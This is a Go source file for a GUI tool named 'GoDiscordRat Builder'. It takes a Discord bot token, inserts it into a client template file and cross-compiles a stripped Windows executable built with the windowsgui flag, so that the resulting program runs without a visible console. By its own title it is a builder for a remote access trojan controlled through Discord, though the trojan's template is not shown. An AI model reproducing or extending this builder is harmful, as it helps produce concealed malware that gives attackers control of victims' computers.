package main

import (
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"

	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func builder(token string, filename string) error {
	if filename == "" {
		return fmt.Errorf("filename is empty")
	}

	text, err := os.ReadFile("client.latepatches")
	if err != nil {
		return fmt.Errorf("read template: %w", err)
	}
	text2 := strings.ReplaceAll(string(text), "{{TOKEN}}", token)

	buildDir, err := os.MkdirTemp(".", "build-tmp-*")
	if err != nil {
		return fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(buildDir)

	buildDirAbs, err := filepath.Abs(buildDir)
	if err != nil {
		return fmt.Errorf("abs build dir: %w", err)
	}

	if err := os.WriteFile(filepath.Join(buildDirAbs, "main.go"), []byte(text2), 0600); err != nil {
		return fmt.Errorf("write source: %w", err)
	}

	goBin, err := exec.LookPath("go")
	if err != nil {
		return fmt.Errorf("go not found on PATH: %w", err)
	}

	absOut, err := filepath.Abs(filename + ".exe")
	if err != nil {
		return fmt.Errorf("abs out: %w", err)
	}

	cmd := exec.Command(goBin, "build", "-ldflags=-H=windowsgui -s -w", "-o", absOut, ".")
	cmd.Dir = buildDirAbs
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("go build failed: %w", err)
	}

	if _, err := os.Stat(absOut); err != nil {
		return fmt.Errorf("build reported success but output missing: %w", err)
	}

	return nil
}

func main() {
	a := app.New()
	w := a.NewWindow("GoDiscordRat Builder")

	logs := widget.NewMultiLineEntry()
	filename := widget.NewEntry()
	filename.SetPlaceHolder("File Name")
	bottoken := widget.NewEntry()
	bottoken.SetPlaceHolder("Bot Token")

	build := widget.NewButton("Build", func() {
		logs.Append("Build Started\n")
		if err := builder(bottoken.Text, filename.Text); err != nil {
			logs.Append("Error: " + err.Error() + "\n")
			return
		}
		logs.Append(filename.Text + ".exe has been created.\n")
	})

	w.Resize(fyne.NewSize(400, 400))

	w.SetContent(
		container.NewVBox(
			filename,
			bottoken,
			build,
			logs,
		),
	)
	w.ShowAndRun()
}